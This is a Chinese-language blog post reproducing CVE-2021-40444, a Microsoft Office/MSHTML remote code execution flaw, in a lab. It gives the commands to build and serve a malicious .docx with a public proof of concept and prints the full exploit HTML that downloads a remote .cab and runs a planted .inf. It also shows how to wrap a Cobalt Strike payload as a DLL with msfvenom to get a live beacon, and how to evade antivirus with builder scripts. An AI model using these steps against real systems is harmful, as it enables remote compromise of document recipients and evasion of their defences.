---
title: Microsoft Office Word RCE
tags:
  - vuln
  - CVE-2021-40444
categories:
  - 漏洞复现
copyright: true
abbrlink: 68f50248
index_img: https://img12.360buyimg.com/ddimg/jfs/t1/210666/12/1548/15263/614a4c1dE3ca3a6b7/bb2726bf4bb21aa2.png
banner_img: https://img12.360buyimg.com/ddimg/jfs/t1/210666/12/1548/15263/614a4c1dE3ca3a6b7/bb2726bf4bb21aa2.png
date: 2021-09-21 21:07:17
---


Microsoft Office Word 远程代码执行(CVE-2021-40444)

### 0x01 简介

&ensp; 推特又又又披露了个0day，该漏洞会影响多个版本的 Windows。 此漏洞（CVE-2021-40444）目前通过恶意Office 365文档传播，需要用户输入才能打开文件才能触发。跟十年前的[IE网马](https://tech.qq.com/a/20100122/000124.htm) 一样，IE自动安装新的插件导致的漏洞，以及office可以引用mshtml格式，导致排版引擎模板可执行。

### 0x02 复现环境

parrotOS 

https://www.parrotsec.org/

Windows 10（1903）

Office 2016增强版

### 0x03 操作

先安装lcab

`sudo apt install lcab`

下载PoC ：`git clone https://github.com/lockedbyte/CVE-2021-40444`

进入到poc目录执行命令生成.docx文件（默认为弹计算器）

```bash
python3 exploit.py generate test/calc.dll http://192.168.176.139
```

![](https://s1.ax1x.com/2023/06/24/pCt644f.png)

然后执行：

```
sudo python3 exploit.py host 80
```

把`out/document.docx` 复制到Windows10中，ProcessMonitor过滤msword.inf事件（为后续观察）。

![](https://s1.ax1x.com/2023/06/24/pCt6o8S.png)

office打开，就会先弹窗cmd窗口，然后弹出计算器。

![](https://s1.ax1x.com/2023/06/24/pCt6RHI.png)

parrot上可以看到接收到了请求

![](https://s1.ax1x.com/2023/06/24/pCt6hUP.png)

github公开的deob.html。

https://github.com/lockedbyte/CVE-2021-40444/blob/master/srv/deob.html

```html
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Expires" content="-1">
        <meta http-equiv="X-UA-Compatible" content="IE=11">
    </head>
    <body>
        <script>
            function garbage() {
                return 'garbage';
            }
            (function exploit() {
                var iframe = window["Document"]['prototype']['createElement']['call'](window["document"], 'iframe');
                try {
                    window["HTMLElement"]["prototype"]["appendChild"]['call'](window["document"]['body'], iframe);
                } catch (_0x1ab454) {
                    window["HTMLElement"]["prototype"]["appendChild"]['call'](window["document"]['documentElement'], iframe);
                }
                var htmlfile = iframe['contentWindow']['ActiveXObject']
                  , htmlfile2 = new htmlfile('htmlfile');
                iframe['contentDocument']['open']()['close']();
                try {
                    window["HTMLElement"]["prototype"]["removeChild"]['call'](window["document"]['body'], iframe);
                } catch (_0x3b004e) {
                    window["HTMLElement"]["prototype"]["removeChild"]['call'](window["document"]['documentElement'], iframe);
                }
                htmlfile2['open']()['close']();
                var htmlfile3 = new htmlfile2[('Script')]['ActiveXObject']('htmlfile');
                htmlfile3['open']()['close']();
                var htmlfile4 = new htmlfile3[('Script')]['ActiveXObject']('htmlfile');
                htmlfile4['open']()['close']();
                var htmlfile5 = new htmlfile4[('Script')]['ActiveXObject']('htmlfile');
                htmlfile5['open']()['close']();
                var ActiveXObjectVAR = new ActiveXObject('htmlfile')
                  , ActiveXObjectVAR2 = new ActiveXObject('htmlfile')
                  , ActiveXObjectVAR3 = new ActiveXObject('htmlfile')
                  , ActiveXObjectVAR4 = new ActiveXObject('htmlfile')
                  , ActiveXObjectVAR5 = new ActiveXObject('htmlfile')
                  , ActiveXObjectVAR6 = new ActiveXObject('htmlfile')
                  , XMLHttpR = new window['XMLHttpRequest']()
                  , XMLHttpRopen = window['XMLHttpRequest']['prototype']['open']
                  , XMLHttpRsend = window['XMLHttpRequest']['prototype']['send'];
                XMLHttpRopen['call'](XMLHttpR, 'GET', 'http://127.0.0.1/test.cab', ![]),
                XMLHttpRsend['call'](XMLHttpR),
                htmlfile5['Script']['document']['write']('body>');
                var htmlScript = window["Document"]['prototype']['createElement']['call'](htmlfile5['Script']['document'], 'object');
                htmlScript['setAttribute']('codebase', 'http://127.0.0.1/test.cab#version=5,0,0,0');
                // 指定CLSID，office 2016之后的才有。
                htmlScript['setAttribute']('CLSID:edbc374c-5730-432a-b5b8-de94f0b57217'),
                window["HTMLElement"]["prototype"]["appendChild"]['call'](htmlfile5['Script']['document']['body'], htmlScript),
                 // cpl执行列，多个路径队列，总会有一个是天选之人的。
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:../../../AppData/Local/Temp/Low/championship.inf',
                ActiveXObjectVAR2['Script']['location'] = '.cpl:../../../AppData/Local/Temp/championship.inf',
                ActiveXObjectVAR3['Script']['location'] = '.cpl:../../../../AppData/Local/Temp/Low/championship.inf',
                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../../../AppData/Local/Temp/championship.inf',
                ActiveXObjectVAR5['Script']['location'] = '.cpl:../../../../../Temp/Low/championship.inf',
                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../../../../Temp/championship.inf',
                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../Low/championship.inf',
                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../championship.inf';
            }());
        </script>
    </body>
</html>
```

实例化一个ActiveXObject，调用XMLHttpRequest请求远程的cab,然后IE将其解压到Temp。

大致流程：

> 发起远程请求-->mshtml.dll解析-->下载cab文件 -->从IE的TEMP目录找到临时的cab文件解压C:\Users\xxx\AppData\Local\Temp-->control.exe调用inf

目录`C:\Users\admin\AppData\Local\Temp`生成一个.inf文件（）实际上是执行弹出计算器的dll文件。

![](https://s1.ax1x.com/2023/06/24/pCt62DA.png)

详见：https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/

**ProcessMonitor**

rundll32运行了msword.inf（dll）

![](https://s1.ax1x.com/2023/06/24/pCt6Lbn.png)

### 0x04 CS上线

CS设置好监听器，然后生成Raw类型32位payload。

![](https://s1.ax1x.com/2023/06/24/pCt6gud.png)

使用msfvenom把payload转换成dll。

```bash
msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -f dll -o shell.dll
```

然后把转换后的dll（shell.dll）复制到PoC目录 test文件夹下，执行exploit.py生成恶意docx文件。当然也可以也不复制，执行exploit.py时指定路径即可。

```bash
python3 exploit.py generate test/shell.dll http://192.168.176.139
udo python3 exploit.py host 80
```

office打开docx文件，Bigo！CS上线成功。

![](https://s1.ax1x.com/2023/06/24/pCt6fEt.png)

![](https://s1.ax1x.com/2023/06/24/pCt6jU0.png)

### 0x05 Bypass AV？

现在各大杀软更新了指纹库。

![](https://s1.ax1x.com/2023/06/24/pCt6Tgg.png)

使用 https://github.com/aslitsecurity/CVE-2021-40444_builders bypass

1、CS生成原生payload，msf转换成dll；

2、重命名dll -> IEcache.inf，python generate_cab.py生成cab；

3、生成html，`python generate_html.py http://[attack ip]/winupdate.cab tests.txt`;

4、生成doc，` generate_doc.py HTTP:\\[attack ip]\tests.txt`

5、cab、tests.txt放到parrpt上，启web服务。

火绒pass

![](https://s1.ax1x.com/2023/06/24/pCt67vQ.png)

某数字pass

![](https://s1.ax1x.com/2023/06/24/pCt6XEq.png)

Defender，GG

![](https://s1.ax1x.com/2023/06/24/pCt6qDs.png)

Office打开 doc ，Bigo！

![](https://s1.ax1x.com/2023/06/24/pCt6buj.png)

Reference

https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/

https://github.com/lockedbyte/CVE-2021-40444/

https://github.com/aslitsecurity/CVE-2021-40444_builders

